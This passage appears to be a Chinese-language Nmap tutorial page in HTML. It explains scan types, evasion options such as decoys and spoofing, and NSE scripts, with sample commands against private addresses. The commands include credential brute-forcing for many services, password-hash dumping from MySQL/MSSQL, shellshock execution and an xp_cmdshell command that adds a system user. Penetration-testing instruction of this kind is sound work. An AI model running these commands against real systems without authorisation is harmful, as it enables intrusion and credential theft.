+<td>a. 列出指定网络上的每台主机， 不发送任何报文到目标主机 <br><br> b. 默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口 <br><br> c. 禁止主机发现，使Nmap对每一个指定的目标IP地址进行扫描 <br><br> d. 发送一个设置了SYN标志位的空TCP报文，适用于突破有状态的规则来封锁非预期的报文的防火墙 <br><br> e. 设置TCP的ACK标志位，适用于突破无状态防火墙规则 <br><br> f. 可穿越只过滤TCP的防火墙和过滤器，默认端口31338 <br><br> g. -PE选项打开该回声请求功能，时间戳和地址掩码查询可以分别用-PP和-PM选项发送 <br><br> h. ARP扫描比基于IP的扫描更快更可靠，常用于扫描一个以太局域网，不想要ARP扫描，指定–send-ip <br><br> i. 不对发现的活动IP地址进行反向域名解析，提升探测速度 <br><br> j. 对目标IP地址作反向域名解析，当发现机器正在运行时进行这项操作 <br><br> k. 执行较慢，多用于IPv6扫描</td>
+</tr>
+<tr>
+<td>端口扫描</td>
+<td>a. -sS (TCP SYN扫描) <br><br>b. -sT (TCP connect()扫描) <br><br>c. -sU (UDP扫描) <br><br>d. -sN; -sF; -sX (TCP Null，FIN，and Xmas扫描) <br><br>e. -sA (TCP ACK扫描) <br><br> f. -sW (TCP窗口扫描)<br><br>g. -sM (TCP Maimon扫描)<br><br> h. –scanflags (定制的TCP扫描)<br><br>i. -sI &lt;zombie host[:probeport]&gt; (Idlescan) <br><br>j. -sO (IP协议扫描) <br><br> k. -b [ftp relay host] (FTP弹跳扫描)</td>
+<td>a. 半开放扫描，发送一个SYN报文，然后等待响应， SYN/ACK表示端口在监听 (开放)，RST (复位)表示没有监听者<br><br>b. 全连接扫描，通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，连接易被记录 <br><br>c. 常用UDP服务：DNS，SNMP，和DHCP (注册的端口是53，161/162，和67/68)；UDP扫描发送空的UDP报头到每个目标端口，若服务响应一个UDP报文，证明该端口是open(开放的)；扫描较慢 <br><br> d. 如果收到一个RST报文，该端口被认为是 closed(关闭的)，没有响应则意味着端口是open/filtered(开放或者被过滤的)；收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为被过滤的 <br><br>e. 设置ACK标志位， open(开放的)和closed(关闭的) 端口都会返回RST报文，标记为 unfiltered(未被过滤的)；不响应的端口或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的) <br><br>f. 根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed <br><br> g. 探测报文是FIN/ACK，其余与Null，FIN，以及Xmas扫描完全一样<br><br>h. 通过指定任意TCP标志位来设计自己的扫描 <br><br> i. 允许对目标进行真正的TCP端口盲扫描，无报文从所用真实IP地址发送到目标<br><br>j. 确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等) <br><br>k. 请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口，错误消息会描述端口是开放还是关闭的</td>
+</tr>
+<tr>
+<td>服务/版本探测</td>
+<td>a. -sV (版本探测) <br><br> b. –allports (不为版本探测排除任何端口)<br><br>c. –version-intensity [intensity] (设置版本扫描强度) <br><br>d. –version-light (打开轻量级模式) <br><br>e. –version-all (尝试每个探测) <br><br> f. –version-trace (跟踪版本扫描活动)<br><br>g. -sR (RPC扫描)</td>
+<td>a. 可以用-A同时打开操作系统探测和版本探测<br><br>b. 指定–allports扫描所有端口，默认情况下，Nmap版本探测会跳过9100TCP端口(打印机服务) <br><br> c. 进行版本扫描(-sV)时，nmap发送一系列探测报文 ，每个报文都被赋予一个1到9之间的值，数值越高， 服务越有可能被正确识别；强度值必须在0和9之间，默认是7<br><br>d. –version-intensity 2的别名，使版本扫描快许多，但它识别服务的可能性也略微小一点 <br><br>e. –version-intensity 9的别名， 保证对每个端口尝试每个探测报文 <br><br>f. 打印出详细的关于正在进行的扫描的调试信息，是用–packet-trace所得到的信息的子集<br><br>g. 对所有被发现开放的TCP/UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，被-sV版本探测包括</td>
+</tr>
+<tr>
+<td>操作系统探测</td>
+<td>a. -O (启用操作系统检测)<br><br> b. –osscan-limit (针对指定的目标进行操作系统检测)<br><br> c. –osscan-guess; –fuzzy (推测操作系统检测结果)</td>
+<td>a. 可以使用-A来同时启用操作系统检测和版本检测 <br><br> b. 只对满足条件的主机进行操作系统检测，可以节约时间，特别在使用-P0扫描多个主机时<br><br> c. 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配</td>
+</tr>
+<tr>
+<td>时间/性能</td>
+<td>a. –min-hostgroup [milliseconds]; –max-hostgroup [milliseconds] (调整并行扫描组的大小)<br><br>b. –min-parallelism [milliseconds]; –max-parallelism [milliseconds] (调整探测报文的并行度)<br><br>c. –min-rtt-timeout [milliseconds]， –max-rtt-timeout [milliseconds]， –initial-rtt-timeout [milliseconds] (调整探测报文超时)<br><br>d. –host-timeout [milliseconds] (放弃低速目标主机)<br><br> e. –scan-delay [milliseconds]; –max-scan-delay [milliseconds] (调整探测报文的时间间隔)<br><br>f. -T [Paranoid/Sneaky/Polite/Normal/Aggressive/Insane] (设置时间模板)</td>
+<td>a. 将多个目标IP地址空间分成组，然后在同一时间对一个组进行扫描；主要用途是说明一个最小组的大小，使得整个扫描更加快速，通常选择256来扫描C类网段<br><br>b. 控制用于主机组的探测报文数量，可用于端口扫描和主机发现；–max-parallelism选项通常设为1，以防止Nmap在同一时间 向主机发送多个探测报文<br><br>c. 如果所有的主机都在本地网络，对于–max-rtt-timeout值来说，100毫秒比较合适。如果存在路由，使用ICMP ping工具ping主机，查看大约10个包的最大往返时间，然后将 –initial-rtt-timeout设成这个时间的2倍，–max-rtt-timeout 可设成这个时间值的3倍或4倍。不管ping的时间是多少，最大的rtt值不得小于100ms， 不能超过1000ms<br><br>d. 使用 –host-timeout选项来说明等待的时间(毫秒)<br><br>e. 用于控制针对一个主机发送探测报文的等待时间(毫秒)<br><br>f. Nmap使用6个时间模板，采用-T选项及数字(0 - 5) 或模板名称paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)优化扫描时间；默认模式为Normal(-T3)，-T4选项较常用，可适当加速扫描</td>
+</tr>
+<tr>
+<td>隐蔽扫描</td>
+<td>a. -f (报文分段); –mtu (使用指定的MTU) <br><br>b. -D &lt;decoy1 [，decoy2][，ME]，…&gt; (使用诱饵隐蔽扫描)<br><br>c. -S [IP_Address] (源地址哄骗) <br><br>d. -e [interface] (使用指定的接口)<br><br>e. –source-port [portnumber]; -g [portnumber] (源端口哄骗) <br><br> –spoof-mac [mac address，prefix，or vendor name] (MAC地址哄骗)</td>
+<td>a. -f选项要求扫描时(包挺ping扫描)使用 小的IP包分段，使用–mtu选项可 以自定义偏移的大小，使用时不需要-f，偏移量必须 是8的倍数<br><br>b. 使用逗号分隔每个诱饵主机，也可用自己的真实IP作为诱饵，使用ME选项说明。如果在第6个位置或更后的位置使用ME选项，一些常用端口扫描检测器(如Solar Designer’s excellent scanlogd)就不会报告这个真实IP<br><br>c. -S选项并说明所需发送包的接口IP地址 <br><br>d. 告诉Nmap使用哪个接口发送和接收报文<br><br>e. -g和–source-port选项从指定端口发送数据<br><br>在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 –send-eth选项，以保证Nmap真正发送以太网包</td>
+</tr>
+<tr>
+<td>输出</td>
+<td>a. -oN [filespec] (标准输出)<br><br>b. -oX [filespec] (XML输出) <br><br> c. –append-output (在输出文件中添加)<br><br> d. –resume [filename] (继续中断的扫描)<br><br> e. –stylesheet [path or URL] (设置XSL样式表，转换XML输出)</td>
+<td>a. 将标准输出直接写入指定的文件<br><br>b. 要求XML输出直接写入指定的文件 <br><br> c. 保留现有内容，将结果添加在现 有文件后面，-oN选项有效<br><br> d. 标准扫描 (-oN)或Grep扫描(-oG)日志被保留，使用选项 –resume并说明标准/Grep扫描输出文件，不允许使用其它参数，Nmap会解析输出文件并使用原来的格式输出<br><br> e. Nmap提从了XSL样式表nmap.xsl，用于查看或转换XML输出至HTML</td>
+</tr>
+<tr>
+<td>细节信息</td>
+<td>a. -v (提高输出信息的详细度)<br><br>b. -d [level] (提高或设置调试级别)<br><br> c. –packet-trace (跟踪发送和接收的报文)<br><br> d. –iflist (列举接口和路由)</td>
+<td>a. 此选项使用两次，会提供更详细的信息  <br><br>b. 使用细节选项(-v)时，可启用命令行参数 (-d)，多次使用可提高调试级别<br><br>c. 要求Nmap打印发送和接收的每个报文的摘要，通常用于调试；为避免输出过多的行，可以限制扫描的端口数，如-p20-30；如果只需进行版本检测，使用–version-trace<br><br> d. 输出Nmap检测到的接口列表和系统路由，用于调试路由问题或设备描述失误</td>
+</tr>
+</tbody></table>
+<h4 id="2-端口选项"><a href="#2-端口选项" class="headerlink" title="2. 端口选项"></a>2. 端口选项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认情况下，Nmap用指定的协议对端口1到1024以及nmap-services 文件中列出的更高的端口在扫描</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-p [port ranges] (只扫描指定的端口)</td>
+<td>指定想扫描的端口，覆盖默认值； -p U:53，111，137，T:21-25，80，139，8080：将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口</td>
+</tr>
+<tr>
+<td>-F (快速 (有限的端口) 扫描)</td>
+<td>nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口</td>
+</tr>
+<tr>
+<td>-r (不要按随机顺序扫描端口)</td>
+<td>默认情况下，Nmap按随机顺序扫描端口，可以指定-r来顺序端口扫描</td>
+</tr>
+</tbody></table>
+<h4 id="3-扫描实战"><a href="#3-扫描实战" class="headerlink" title="3. 扫描实战"></a>3. 扫描实战</h4><p>全面扫描目标主机的所有信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A  -v 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<p>扫描目标机器详细服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV -sT -Pn --open -v 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<p>探测目标操作系统类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ namp -O -v 192.168.0.233</span><br></pre></td></tr></table></figure>
+
+<p>扫描指定的常用端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ namp -p U:53,111,137,T:21-25,80,139,8080 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<p>内网arp扫描,探测内网存活主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sn -PR 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>快速扫描整个C段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -T5 --open 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>观察扫描时的详细发包过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --packet-trace  192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>扫描目标机器服务banner信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sT -Pn --open -v banner.nse 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<p>常用组合语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --open -p port -Pn -v -sT -sV --script script_name ip/domain/cidr</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-脚本引擎"><a href="#0x03-脚本引擎" class="headerlink" title="0x03 脚本引擎"></a>0x03 脚本引擎</h3><h4 id="1-脚本分类"><a href="#1-脚本分类" class="headerlink" title="1. 脚本分类"></a>1. 脚本分类</h4><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>auth</td>
+<td>负责处理鉴权证书（绕开鉴权）的脚本</td>
+</tr>
+<tr>
+<td>broadcast</td>
+<td>在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</td>
+</tr>
+<tr>
+<td>brute</td>
+<td>提供暴力破解方式，针对常见的应用如http/snmp等</td>
+</tr>
+<tr>
+<td>default</td>
+<td>使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</td>
+</tr>
+<tr>
+<td>discovery</td>
+<td>对网络进行更多的信息，如SMB枚举、SNMP查询等</td>
+</tr>
+<tr>
+<td>dos</td>
+<td>用于进行拒绝服务攻击</td>
+</tr>
+<tr>
+<td>exploit</td>
+<td>利用已知的漏洞入侵系统</td>
+</tr>
+<tr>
+<td>external</td>
+<td>利用第三方的数据库或资源，例如进行whois解析</td>
+</tr>
+<tr>
+<td>fuzze</td>
+<td>模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</td>
+</tr>
+<tr>
+<td>malware</td>
+<td>探测目标机是否感染了病毒、开启了后门等信息</td>
+</tr>
+<tr>
+<td>safe</td>
+<td>此类与intrusive相反，属于安全性脚本</td>
+</tr>
+<tr>
+<td>version</td>
+<td>负责增强服务与版本扫描（Version Detection）功能的脚本</td>
+</tr>
+<tr>
+<td>vuln</td>
+<td>负责检查目标机是否有常见的漏洞（Vulnerability）</td>
+</tr>
+</tbody></table>
+<h4 id="2-脚本选项"><a href="#2-脚本选项" class="headerlink" title="2. 脚本选项"></a>2. 脚本选项</h4><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-sC/–script=default</td>
+<td>使用默认的脚本进行扫描</td>
+</tr>
+<tr>
+<td>–script=<lua scripts></lua></td>
+<td>使用某个脚本进行扫描</td>
+</tr>
+<tr>
+<td>–script-args=x=x,y=y</td>
+<td>为脚本提供参数</td>
+</tr>
+<tr>
+<td>–script-args-file=filename</td>
+<td>使用文件来为脚本提供参数</td>
+</tr>
+<tr>
+<td>–script-trace</td>
+<td>显示脚本执行过程中发送与接收的数据</td>
+</tr>
+<tr>
+<td>–script-updatedb</td>
+<td>更新脚本数据库</td>
+</tr>
+<tr>
+<td>–script-help=[Lua scripts]</td>
+<td>显示脚本的帮助信息</td>
+</tr>
+</tbody></table>
+<h3 id="0x04-实用脚本"><a href="#0x04-实用脚本" class="headerlink" title="0x04 实用脚本"></a>0x04 实用脚本</h3><h4 id="1-FTP扫描脚本"><a href="#1-FTP扫描脚本" class="headerlink" title="1. FTP扫描脚本"></a>1. FTP扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 21 --script ftp-bounce.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ftp-anon.nse</td>
+<td>检查目标ftp是否允许匿名登录</td>
+</tr>
+<tr>
+<td>ftp-bounce.nse</td>
+<td>检查目标ftp是否允许使用弹跳法进行端口扫描</td>
+</tr>
+<tr>
+<td>ftp-brute.nse</td>
+<td>ftp爆破脚本</td>
+</tr>
+<tr>
+<td>ftp-libopie</td>
+<td>检查FTP是否存在CVE-2010-1938 (OPIE off-by-one 堆栈溢出)漏洞</td>
+</tr>
+<tr>
+<td>ftp-vuln-cve2010-4221</td>
+<td>ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</td>
+</tr>
+</tbody></table>
+<h4 id="2-SSH扫描脚本"><a href="#2-SSH扫描脚本" class="headerlink" title="2. SSH扫描脚本"></a>2. SSH扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 22 --script ssh-brute.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ssh-brute.nse</td>
+<td>SSH爆破脚本</td>
+</tr>
+<tr>
+<td>ssh-publickey-acceptance.nse｜公钥认证缺陷扫描</td>
+<td></td>
+</tr>
+<tr>
+<td>ssh-run.nse</td>
+<td>SSH远程命令执行验证</td>
+</tr>
+<tr>
+<td>sshv1.nse</td>
+<td>检查是否存在sshv1低版本漏洞</td>
+</tr>
+</tbody></table>
+<h4 id="3-Telnet扫描脚本"><a href="#3-Telnet扫描脚本" class="headerlink" title="3. Telnet扫描脚本"></a>3. Telnet扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>telnet-brute.nse</td>
+<td>telnet爆破脚本</td>
+</tr>
+</tbody></table>
+<h4 id="4-SMTP扫描脚本"><a href="#4-SMTP扫描脚本" class="headerlink" title="4. SMTP扫描脚本"></a>4. SMTP扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p  25 --script smtp-brute.nse 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>smtp-brute.nse</td>
+<td>SMTP爆破脚本</td>
+</tr>
+<tr>
+<td>smtp-enum-users</td>
+<td>枚举目标smtp服务器的邮件用户名,需目标要存在此错误配置</td>
+</tr>
+<tr>
+<td>smtp-vuln-cve2010-4344</td>
+<td>Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</td>
+</tr>
+<tr>
+<td>smtp-vuln-cve2011-1720</td>
+<td>Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</td>
+</tr>
+<tr>
+<td>smtp-vuln-cve2011-1764</td>
+<td>Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞</td>
+</tr>
+</tbody></table>
+<h4 id="5-POP3扫描脚本"><a href="#5-POP3扫描脚本" class="headerlink" title="5. POP3扫描脚本"></a>5. POP3扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 110 --script pop3-brute.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pop3-brute</td>
+<td>pop简单弱口令爆破脚本</td>
+</tr>
+</tbody></table>
+<h4 id="6-IMAP扫描脚本"><a href="#6-IMAP扫描脚本" class="headerlink" title="6. IMAP扫描脚本"></a>6. IMAP扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 143,993 --script imap-brute.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>imap-brute</td>
+<td>imap简单弱口令爆破</td>
+</tr>
+</tbody></table>
+<h4 id="7-DNS利用脚本"><a href="#7-DNS利用脚本" class="headerlink" title="7. DNS利用脚本"></a>7. DNS利用脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=target.org -v 192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dns-brute.nse</td>
+<td>尝试通过暴力猜测常见子域来枚举DNS主机名</td>
+</tr>
+<tr>
+<td>dns-fuzz.nse</td>
+<td>对DNS服务器发起DNS模糊攻击</td>
+</tr>
+<tr>
+<td>dns-random-srcport.nse</td>
+<td>检查DNS服务器是否存在可预测的端口递归漏洞(CVE-2008-1447)</td>
+</tr>
+<tr>
+<td>dns-zone-transfer</td>
+<td>检查目标ns服务器是否允许传送</td>
+</tr>
+</tbody></table>
+<h4 id="8-SNMP扫描脚本"><a href="#8-SNMP扫描脚本" class="headerlink" title="8. SNMP扫描脚本"></a>8. SNMP扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=user.txt 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>snmp-brute</td>
+<td>SNMP暴力破解</td>
+</tr>
+</tbody></table>
+<h4 id="9-LDAP扫描脚本"><a href="#9-LDAP扫描脚本" class="headerlink" title="9. LDAP扫描脚本"></a>9. LDAP扫描脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 389 --script ldap-brute --script-args ldap.base=&apos;&quot;cn=users,dc=cqure,dc=net&quot;&apos; 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ldap-brute</td>
+<td>尝试强行进行LDAP认证爆破</td>
+</tr>
+<tr>
+<td>ldap-search</td>
+<td>尝试执行LDAP搜索并返回所有匹配项</td>
+</tr>
+</tbody></table>
+<h4 id="10-Web利用脚本"><a href="#10-Web利用脚本" class="headerlink" title="10. Web利用脚本"></a>10. Web利用脚本</h4><table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xmpp-brute.nse</td>
+<td>xmpp爆破</td>
+<td>$ nmap -p 5222 –script xmpp-brute.nse  192.168.1.0/24</td>
+</tr>
+<tr>
+<td>http-iis-short-name-brute.nse</td>
+<td>短文件扫描</td>
+<td>$ nmap -p80 –script http-iis-short-name-brute.nse 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>http-shellshock.nse</td>
+<td>bash远程执行</td>
+<td>$ nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>http-svn-info.nse</td>
+<td>探测目标svn</td>
+<td>$ nmap –script http-svn-info 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>http-wordpress-brute.nse</td>
+<td>wordpress爆破</td>
+<td>$ nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true’ 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>http-backup-finder.nse</td>
+<td>扫描目标网站备份</td>
+<td>$ nmap -p80 –script=http-backup-finder 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>http-vuln-cve2015-1635.nse</td>
+<td>iis6.0远程代码执行</td>
+<td>$ nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/‘  192.168.1.0/24</td>
+</tr>
+</tbody></table>
+<h4 id="11-数据库利用脚本"><a href="#11-数据库利用脚本" class="headerlink" title="11. 数据库利用脚本"></a>11. 数据库利用脚本</h4><table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>informix-brute.nse</td>
+<td>informix爆破脚本</td>
+<td>$ nmap -p 9088 –script informix-brute.nse 192.168.1.233</td>
+</tr>
+<tr>
+<td>mysql-empty-password.nse</td>
+<td>mysql 扫描root空密码</td>
+<td>$ nmap -p 3306 –script mysql-empty-password.nse -v 192.168.1.233</td>
+</tr>
+<tr>
+<td>mysql-brute.nse</td>
+<td>mysql root弱口令简单爆破</td>
+<td>$ nmap -p 3306 –script mysql-brute.nse -v 192.168.1.233</td>
+</tr>
+<tr>
+<td>mysql-dump-hashes.nse</td>
+<td>导出mysql中所有用户的hash</td>
+<td>$ nmap -p 3306 –script mysql-dump-hashes –script-args=’username=root,password=root’ 192.168.1.233</td>
+</tr>
+<tr>
+<td>mysql-vuln-cve2012-2122.nse</td>
+<td>Mysql身份认证漏洞[MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装]</td>
+<td>$ nmap -p 3306 –script mysql-vuln-cve2012-2122.nse  -v 192.168.1.233</td>
+</tr>
+<tr>
+<td>ms-sql-info.nse</td>
+<td>扫描C段mssql</td>
+<td>$ nmap -p 1433 –script ms-sql-info.nse –script-args mssql.instance-port=1433 -v 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>ms-sql-empty-password.nse</td>
+<td>扫描mssql sa空密码</td>
+<td>$ nmap -p 1433 –script ms-sql-empty-password.nse -v 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>ms-sql-brute.nse</td>
+<td>sa弱口令爆破</td>
+<td>$ nmap -p 1433 –script ms-sql-brute.nse -v 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>ms-sql-xp-cmdshell.nse</td>
+<td>利用xp_cmdshell,远程执行系统命令</td>
+<td>$ nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user test test /add” 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>ms-sql-dump-hashes.nse</td>
+<td>导出mssql中所有的数据库用户及密码hash</td>
+<td>$ nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>pgsql-brute.nse</td>
+<td>尝试爆破postgresql</td>
+<td>$ nmap -p 5432 –script pgsql-brute -v 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>oracle-brute-stealth.nse</td>
+<td>尝试爆破oracle</td>
+<td>$ nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid=ORCL  -v 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>oracle-brute.nse</td>
+<td>Oracle数据库爆破</td>
+<td>$ nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL -v 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>mongodb-brute.nse</td>
+<td>尝试爆破mongdb</td>
+<td>$ nmap -p 27017  –script mongodb-brute 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>redis-brute.nse</td>
+<td>redis爆破</td>
+<td>$ nmap -p 6379 –script redis-brute.nse 192.168.1.0/24</td>
+</tr>
+</tbody></table>
+<h4 id="12-VPN利用脚本"><a href="#12-VPN利用脚本" class="headerlink" title="12. VPN利用脚本"></a>12. VPN利用脚本</h4><table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pptp-version.nse</td>
+<td>识别目标pptp版本</td>
+<td>$ nmap -p 1723 –script pptp-version.nse 192.168.1.0/24</td>
+</tr>
+</tbody></table>
+<h4 id="13-SMB利用脚本"><a href="#13-SMB利用脚本" class="headerlink" title="13. SMB利用脚本"></a>13. SMB利用脚本</h4><p>SMB远程执行漏洞脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smb-vuln-ms06-025.nse</span><br><span class="line">smb-vuln-ms07-029.nse</span><br><span class="line">smb-vuln-ms08-067.nse</span><br><span class="line">smb-vuln-ms10-054.nse</span><br><span class="line">smb-vuln-ms10-061.nse</span><br><span class="line">smb-vuln-ms17-010.nse</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p445 --script smb-vuln-ms17-010.nse 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<h4 id="14-其他脚本"><a href="#14-其他脚本" class="headerlink" title="14. 其他脚本"></a>14. 其他脚本</h4><table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>描述</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rsync-brute.nse</td>
+<td>爆破目标的rsync</td>
+<td>$ nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>rlogin-brute.nse</td>
+<td>爆破目标的rlogin</td>
+<td>$ nmap -p 513 –script rlogin-brute 192.168.1.0/24</td>
+</tr>
+<tr>
+<td>vnc-brute.nse</td>
+<td>爆破目标的vnc</td>
